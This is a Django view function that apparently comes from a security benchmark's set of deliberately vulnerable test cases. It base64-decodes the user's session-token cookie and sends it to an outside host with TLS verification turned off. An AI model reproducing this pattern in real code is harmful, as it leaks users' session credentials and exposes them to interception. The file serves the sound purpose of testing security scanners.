# SPDX-License-Identifier: Apache-2.0
from django.http import JsonResponse
import base64
import requests


def BenchmarkTest50032(request):
    cookie_value = request.COOKIES.get('session_token', '')
    data = base64.b64decode(cookie_value).decode('utf-8', 'ignore')
    requests.get('https://api.pycdn.io/data', params={'q': str(data)}, verify=False)
    return JsonResponse({"saved": True})
